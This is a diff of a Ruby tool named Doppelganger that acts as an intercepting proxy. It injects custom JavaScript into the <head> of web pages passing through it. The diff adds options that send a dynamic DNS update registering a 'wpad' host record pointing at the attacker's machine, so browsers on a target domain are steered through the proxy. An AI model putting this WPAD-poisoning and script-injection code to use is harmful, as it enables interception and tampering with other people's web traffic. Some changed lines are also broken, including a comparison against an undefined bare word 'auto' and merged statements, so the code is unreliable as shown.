@@ -20,7 +20,7 @@ require "packr"
 $eviltwin_mapping = nil
 $eviltwins = []
 
-$doppelganger_config = nil
+$doppelganger_config = {}
 
 class Doppelganger
 	@config = nil
@@ -34,7 +34,7 @@ class Doppelganger
 
 	@HttpdAddr = nil
 	@HttpdPort = 80
-	@HttpdFileRoot = "./webdistort_htdocs/"
+	@HttpdFileRoot = "./htdocs/"
 
 	@DnsDomain = nil
 	@DnsServer = nil
@@ -43,7 +43,6 @@ class Doppelganger
 
 	def initialize(config)
 		@config = config
-		$doppelganger_config = config
 
 		puts "Starting Doppelganger"
 		@Program = Doppelganger::Program.new(config)
@@ -168,9 +167,6 @@ class Doppelganger
 
 		@RandomNum = 0
 
-		@GoogleScript = nil
-		@GoogleScriptVer = nil
-
 		def initialize(config)
 			@InjectionScripts = Array["utility.js", "inject.js"]
 			@PackedScripts = {}
@@ -189,9 +185,6 @@ class Doppelganger
 			@ProxyExclusionList = nil
 			@ProxyInclusionList = nil
 			@ProxyPid = nil
-
-			@GoogleScript = config[:AJAXLibrary]
-			@GoogleScriptVer = config[:AJAXLibraryVersion]
 
 			@HttpdFileRoot = config[:HttpdFileRoot]
 
@@ -386,8 +379,7 @@ class Doppelganger
 					javascriptInject = "<head><script src='http://www.google.com/jsapi'></script>#{googleLoadString}"
 					if response.body != nil
 						response.body.gsub!(/<head>/i) {|block| javascriptInject}
-					end
-					return response.body
+					end 					return response.body
 			else
 				return response.body				
 			end
@@ -542,13 +534,21 @@ class Doppelganger
 		end	
 
 		def UpdateDNS
-			dns_update = Dnsruby::Update.new(@domain)
-			host = 'wpad.' + @domain
+			target_domain = $doppelganger_config[:TargetDomain]
+			target_name_server = $doppelganger_config[:TargetNameServer]
+			target_wpad_host = $doppelganger_config[:TargetWpadHost]
+
+			if target_wpad_host == auto
+				target_wpad_host = GetIPAddress
+			end
+			
+			dns_update = Dnsruby::Update.new(target_domain)
+			host = 'wpad.' + target_domain
 
 			dns_update.absent(host, 'A')	
-			dns_update.add(host, 'A', 86400, @host_ip)
+			dns_update.add(host, 'A', 86400, target_wpad_host)
 
-			dns_resolver = Dnsruby::Resolver.new(:nameserver => @target_name_server)
+			dns_resolver = Dnsruby::Resolver.new(:nameserver => target_name_server)
 
 			begin
 				response = dns_resolver.send_message(dns_update)
@@ -678,13 +678,6 @@ optionParser = OptionParser.new do |opts|
 		exit
 	end
 
-	opts.separator ""
-	opts.separator "Required Settings"
-	opts.separator ""
-
-	opts.on("-j", "--javascript file1,file2", Array, "List of custom javascript (as templates) to import (required)") do |files|
-		options[:CustomJavascript] = files
-	end
 
 	opts.separator ""
 	opts.separator "Optional Settings"
@@ -699,8 +692,32 @@ optionParser = OptionParser.new do |opts|
 	end
 
 	opts.separator ""
-	opts.separator "Javascript Library Options (Optional)"
+	opts.separator "DNS Options"
 	opts.separator ""
+
+	opts.on("--domain [DOMAIN]",  String, "The domain used to create a WPAD entry.") do |d|
+		options[:TargetDomain] = d
+	end
+
+	opts.on("--nameserver [ADDRESS]", String, "The name server of the specified domain.") do |n|
+		options[:TargetNameServer] = n
+	end
+
+	opts.on("--wpadhost <ADDRESS>", String, "Specify the IP of the wpad host to be entered into DNS. If no address is given Doppelganger will attempt to determine the IP address of the current host.") do |h|
+		if h == nil
+			options[:TargetWpadHost] = "auto"
+		else
+			options[:TargetWpadHost] = h
+		end
+	end
+
+	opts.separator ""
+	opts.separator "Javascript Options"
+	opts.separator ""
+
+	opts.on("-j", "--javascript file1,file2", Array, "List of custom javascript (as templates) to import (required)") do |files|
+		options[:CustomJavascript] = files
+	end
 	
 	opts.on("--jquery [VERSION]", String, "Use specified version of jquery from Google") do |v|
 		options[:JQueryVersion] = v
@@ -742,4 +759,4 @@ end.parse!
 
 pp options
 
-program = Doppelganger.new(options)
+#program = Doppelganger.new(options)
